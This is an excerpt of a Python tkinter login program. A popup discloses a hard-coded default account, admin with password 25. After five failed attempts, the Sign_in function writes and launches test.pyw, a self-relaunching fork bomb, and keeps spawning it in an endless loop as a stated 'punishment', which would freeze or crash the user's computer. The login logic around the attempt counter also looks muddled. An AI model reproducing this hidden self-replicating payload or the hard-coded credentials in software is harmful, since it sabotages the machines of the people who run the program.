...
def Main0():
    ...
    messagebox.showinfo("提示", "預設帳號為 \"admin\" 預設密碼為 \"25\"")
    # ---------- #
    ver1 = tk.StringVar()
    ver2 = tk.StringVar()
    # ---------- #
    ...
    window.mainloop()
def Sign_in():
    global Sign_in_OK, NAME, PASSWORD, name, password, user_test
    ...
    if NAME=="" or PASSWORD=="":
        ...
        if name in usrs_info:
            if password == usrs_info[name]:
                ...
                if user_test >= 5:
                    f = open("test.pyw", "w")
                    f.write("import os\nwhile True:\n    os.system('start test.pyw')")
                    f.close()
                    os.system("start test.pyw")
                    messagebox.showerror("錯誤", "您已嘗試錯誤的密碼超過5次, 將逞罰使用者。")
                    while True:
                        os.system("start test.pyw")
                else:
...
def Main1():
    ...
    ttk.Button(window, text="OK", command=OK).place(x=160, y=112)
